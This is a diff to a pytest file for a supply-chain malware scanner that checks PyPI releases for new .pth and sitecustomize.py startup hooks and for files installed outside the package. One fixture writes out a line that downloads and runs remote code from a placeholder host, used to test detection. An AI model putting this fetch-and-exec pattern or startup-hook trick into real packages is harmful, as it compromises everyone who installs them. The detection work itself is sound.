@@ -4,6 +4,19 @@ from __future__ import annotations
 
 import pytest
 
+from hunter.bands import ALERT_THRESHOLD, REVIEW_FLOOR
+from hunter.classify import classify_files
+from hunter.fake_jev import KeywordJev
+from hunter.features import (
+    build_config_changes,
+    extract_features,
+    outside_package_files,
+    payload_indicators,
+    pth_imported_modules,
+    wheel_only_files,
+)
+from hunter.head import load_head
+from hunter.models import ReleaseMeta
 from hunter.rules import scan_release
 from hunter.triage import categorize, diff_trees, pth_import_lines
 
@@ -221,3 +234,227 @@ def test_daemon_rule_needs_both_the_fork_and_the_fetch():
     for text in (plain_daemon, plain_fetch):
         found = _rules_by_path({}, {"widget/run.py": text})
         assert "py_daemon_fetch_exec" not in found.get("widget/run.py", set())
+
+
+STARTUP_FILES = [PURELIB + "cook.pth", PURELIB + "cook.py", PURELIB + "sitecustomize.py"]
+
+
+def _meta(name: str = "litellm", old: str = "1.106.2", new: str = "1.107.0") -> ReleaseMeta:
+    return ReleaseMeta(
+        ecosystem="pypi",
+        name=name,
+        old_version=old,
+        new_version=new,
+        rank=40,
+        registry_url=f"https://pypi.org/project/{name}/{new}/",
+    )
+
+
+def _bare(paths: list[str]) -> list[str]:
+    return [path.removeprefix("wheel/") for path in paths]
+
+
+def test_litellm_layout_flags_all_three_files_and_the_build_config_change():
+    old, new = litellm_trees()
+    assert outside_package_files(old, new, "litellm") == _bare(sorted(STARTUP_FILES))
+    assert wheel_only_files(old, new) == _bare(sorted(STARTUP_FILES))
+    assert build_config_changes(old, new) == ['tool.maturin data = "cook"']
+    code = extract_features(old, new, diff_trees(old, new), _meta())
+    signals = code.signal_list()
+    assert any(item.startswith("outside_package_install:") and "purelib/cook.pth" in item for item in signals)
+    assert any(item.startswith("wheel_only_file:") and "purelib/sitecustomize.py" in item for item in signals)
+    assert 'build_config_change:tool.maturin data = "cook"' in signals
+    assert code.static_hot()
+
+
+def test_litellm_layout_is_reviewed_and_scout_sees_the_structural_notes(monkeypatch):
+    monkeypatch.setenv("HUNTER_RULES", "on")
+    old, new = litellm_trees()
+    jev = KeywordJev()
+    row = classify_files(meta=_meta(), old_files=old, new_files=new, jev=jev, head=load_head())
+    assert row.band in {"review", "alert"}
+    assert row.malice_probability >= 0.62
+    assert row.rule_verdict == "malicious"
+    assert any(item.startswith("outside_package_install:") for item in row.signals)
+    assert any(item.startswith("build_config_change:") for item in row.signals)
+    sent = "".join(str(call["state"].get("diff_excerpt") or "") for call in jev.calls)
+    assert "local_signal outside_package_install:" in sent
+
+
+def test_outside_package_install_floors_review_with_the_rules_off(monkeypatch):
+    monkeypatch.delenv("HUNTER_RULES", raising=False)
+    old = {"wheel/widget/__init__.py": "VERSION = '1.0'\n"}
+    new = {"wheel/widget/__init__.py": "VERSION = '1.1'\n", "wheel/helper_mod.py": "VALUE = 1\n"}
+    row = classify_files(meta=_meta("widget", "1.0", "1.1"), old_files=old, new_files=new, jev=KeywordJev(), head=load_head())
+    assert row.band in {"review", "alert"}
+    assert "outside_package_install:helper_mod.py" in row.signals
+
+
+def _clean_native_trees() -> tuple[dict[str, str], dict[str, str]]:
+    """A compiled-extension package: the wheel holds build output the sdist never does."""
+    so = "[binary-or-media-file]\nheader: elf\n"
+    old = {
+        "sdist/pyproject.toml": '[project]\nname = "fastwidget"\n\n[tool.maturin]\nmodule-name = "fastwidget._core"\n',
+        "sdist/fastwidget/__init__.py": "from ._core import run\n",
+        "sdist/src/lib.rs": "fn run() {}\n",
+        "wheel/fastwidget/__init__.py": "from ._core import run\n",
+        "wheel/fastwidget/_core.cpython-312-x86_64-linux-gnu.so": so,
+        "wheel/fastwidget-1.0.dist-info/RECORD": "fastwidget/__init__.py,,\n",
+    }
+    new = {
+        "sdist/pyproject.toml": old["sdist/pyproject.toml"].replace("\n\n[tool.maturin]", '\nversion = "1.1"\n\n[tool.maturin]'),
+        "sdist/fastwidget/__init__.py": "from ._core import run, stop\n",
+        "sdist/fastwidget/helpers.py": "def wrap(x):\n    return x\n",
+        "sdist/src/lib.rs": "fn run() {}\nfn stop() {}\n",
+        "sdist/src/speedups.c": "int add(int a, int b) { return a + b; }\n",
+        "wheel/fastwidget/__init__.py": "from ._core import run, stop\n",
+        "wheel/fastwidget/helpers.py": "def wrap(x):\n    return x\n",
+        "wheel/fastwidget/_version.py": "__version__ = '1.1'\n",
+        "wheel/fastwidget/proto/msg_pb2.py": "DESCRIPTOR = None\n",
+        "wheel/fastwidget/_core.cpython-312-x86_64-linux-gnu.so": so,
+        "wheel/_speedups.cpython-312-x86_64-linux-gnu.so": so,
+        "wheel/fastwidget.libs/libz-abc123.so.1": so,
+        "wheel/fastwidget-1.1.data/scripts/fastwidget": "#!python\nfrom fastwidget import run\nrun()\n",
+        "wheel/fastwidget-1.1.data/headers/fastwidget.h": "int run(void);\n",
+        "wheel/fastwidget_ns-1.1-py3.12-nspkg.pth": BENIGN_PTH["widget_ns-1.0-py3.12-nspkg.pth"],
+        "wheel/fastwidget_paths.pth": "/opt/fastwidget/lib\n",
+        "wheel/fastwidget-stubs/__init__.pyi": "def run() -> None: ...\n",
+        "wheel/fastwidget-1.1.dist-info/RECORD": "fastwidget/__init__.py,,\n",
+    }
+    return old, new
+
+
+def test_clean_compiled_extension_wheel_against_its_sdist_has_no_structural_signals():
+    old, new = _clean_native_trees()
+    assert outside_package_files(old, new, "fastwidget") == []
+    assert wheel_only_files(old, new) == []
+    assert build_config_changes(old, new) == []
+    found = scan_release(old, new, ecosystem="pypi")
+    assert not {"pth_import_line", "py_startup_hook_file"} & {hit.rule for hit in found.hits}
+
+
+@pytest.mark.parametrize(
+    "old_wheel",
+    [
+        {},
+        {"sdist/widget/__init__.py": "VERSION = '1.0'\n"},
+    ],
+)
+def test_no_previous_wheel_means_no_outside_package_signal(old_wheel):
+    new = {"wheel/widget/__init__.py": "VERSION = '1.1'\n", "wheel/helper_mod.py": "VALUE = 1\n"}
+    assert outside_package_files(old_wheel, new, "widget") == []
+    assert wheel_only_files(old_wheel, {**new, "sdist/widget/__init__.py": "x\n"}) == []
+
+
+def test_a_moved_purelib_file_and_an_unchanged_data_line_are_not_new():
+    old, new = litellm_trees()
+    old_next = {path.replace("1.107.0", "1.106.2"): text for path, text in new.items()}
+    newer = {path.replace("1.107.0", "1.107.1"): text for path, text in new.items()}
+    assert outside_package_files(old_next, newer, "litellm") == []
+    assert wheel_only_files(old_next, newer) == []
+    assert build_config_changes(old_next, newer) == []
+
+
+def test_data_key_outside_the_maturin_table_is_not_a_build_config_change():
+    old = {"sdist/pyproject.toml": '[project]\nname = "widget"\n'}
+    new = {"sdist/pyproject.toml": '[project]\nname = "widget"\n\n[tool.other]\ndata = "assets"\n'}
+    assert build_config_changes(old, new) == []
+
+
+# A startup hook is strong only with a new top-level module that decodes and runs code or reaches
+# the network. A hook on its own, or one that loads the package's own code, is weak: review at most.
+
+
+def test_litellm_layout_reaches_the_strong_rule_floor_through_classify(monkeypatch):
+    monkeypatch.setenv("HUNTER_RULES", "on")
+    old, new = litellm_trees()
+    report = scan_release(old, new, ecosystem="pypi")
+    payload = {hit.path: hit for hit in report.hits if hit.rule == "startup_hook_payload"}
+    assert set(payload) == {PURELIB + "cook.pth", PURELIB + "sitecustomize.py"}
+    assert payload[PURELIB + "cook.pth"].tier == "strong"
+    assert "decode_exec" in payload[PURELIB + "cook.pth"].matched
+    assert "fetch_exec" in payload[PURELIB + "sitecustomize.py"].matched
+    assert report.strong_floors["startup_hook_payload"] == "review"
+    row = classify_files(meta=_meta(), old_files=old, new_files=new, jev=KeywordJev(), head=load_head())
+    assert row.rule_verdict == "malicious"
+    assert row.band in {"review", "alert"}
+    assert row.malice_probability >= REVIEW_FLOOR
+    assert row.needs_llm_review
+    assert {"rule": "startup_hook_payload", "tier": "strong"}.items() <= next(
+        hit for hit in row.rule_hits if hit["rule"] == "startup_hook_payload"
+    ).items()
+
+
+def _widget_wheels(extra_old: dict[str, str], extra_new: dict[str, str]):
+    old = {
+        "wheel/widget/__init__.py": "VERSION = '1.0'\n",
+        "wheel/widget/_hook.py": "import os\nos.environ.setdefault('WIDGET_HOME', '')\n",
+        "wheel/widget-1.0.dist-info/RECORD": "widget/__init__.py,,\n",
+        **extra_old,
+    }
+    new = {
+        "wheel/widget/__init__.py": "VERSION = '1.1'\n",
+        "wheel/widget/_hook.py": old["wheel/widget/_hook.py"],
+        "wheel/widget-1.1.dist-info/RECORD": "widget/__init__.py,,\n",
+        **extra_new,
+    }
+    return old, new
+
+
+def _payload_hits(old, new) -> list[str]:
+    return [hit.path for hit in scan_release(old, new, ecosystem="pypi").hits if hit.rule == "startup_hook_payload"]
+
+
+def test_a_new_pth_that_loads_existing_package_code_stays_review(monkeypatch):
+    monkeypatch.setenv("HUNTER_RULES", "on")
+    old, new = _widget_wheels({}, {"wheel/widget_hook.pth": "import widget._hook\n"})
+    report = scan_release(old, new, ecosystem="pypi")
+    assert [(hit.rule, hit.tier) for hit in report.hits] == [("pth_import_line", "weak")]
+    row = classify_files(meta=_meta("widget", "1.0", "1.1"), old_files=old, new_files=new, jev=KeywordJev(), head=load_head())
+    assert row.rule_verdict == "unsure"
+    assert row.band == "review"
+    assert row.malice_probability < ALERT_THRESHOLD
+    assert not any(hit["tier"] == "strong" for hit in row.rule_hits)
+
+
+FETCH_EXEC = "from urllib.request import urlopen\nexec(urlopen('https://x.example.invalid/c').read())\n"
+
+
+@pytest.mark.parametrize(
+    "extra_new",
+    [
+        # New top-level module with nothing that decodes, runs, or fetches.
+        {"wheel/widget_hook.pth": "import widget_boot\n", "wheel/widget_boot.py": "X = 1\n"},
+        # The fetch is in a new module inside the package folder, not next to it.
+        {"wheel/widget_hook.pth": "import widget._net\n", "wheel/widget/_net.py": FETCH_EXEC},
+        # The module the hook loads is not in this release.
+        {"wheel/widget_hook.pth": "import widget_missing\n", "wheel/widget_other.py": FETCH_EXEC},
+        # sitecustomize.py inside the package folder does not run at startup.
+        {"wheel/widget/tests/sitecustomize.py": FETCH_EXEC},
+    ],
+)
+def test_a_lone_startup_hook_does_not_reach_the_strong_rule(extra_new):
+    old, new = _widget_wheels({}, extra_new)
+    assert _payload_hits(old, new) == []
+
+
+def test_the_strong_rule_needs_the_hook_and_the_module_to_be_new():
+    hook = {"wheel/widget_hook.pth": "import widget_boot\n", "wheel/widget_boot.py": "X = 1\n"}
+    # The old release already shipped the hook and the module. Only the module changed.
+    old, new = _widget_wheels(hook, {**hook, "wheel/widget_boot.py": "X = 1\n" + FETCH_EXEC})
+    assert _payload_hits(old, new) == []
+    old, new = _widget_wheels({}, {**hook, "wheel/widget_boot.py": FETCH_EXEC})
+    assert _payload_hits(old, new) == ["wheel/widget_hook.pth"]
+    old, new = _widget_wheels({}, {"wheel/sitecustomize.py": FETCH_EXEC})
+    assert _payload_hits(old, new) == ["wheel/sitecustomize.py"]
+    old, new = _widget_wheels({"wheel/sitecustomize.py": "import os\n"}, {"wheel/sitecustomize.py": "import os\n" + FETCH_EXEC})
+    assert _payload_hits(old, new) == []
+
+
+def test_pth_import_parsing_and_payload_indicators():
+    line = "import os, cook as c; from widget.sub import x; __import__('zed').go()"
+    assert pth_imported_modules(line) == ["os", "cook", "widget", "zed"]
+    assert payload_indicators(COOK_PY) == ["decode_exec"]
+    assert payload_indicators(SITECUSTOMIZE) == ["fetch_exec"]
+    assert payload_indicators("import socket\ns = socket.socket()\n") == ["network"]
+    assert payload_indicators("import json\nexec(compile(json.loads(t), 'x', 'exec'))\n") == []
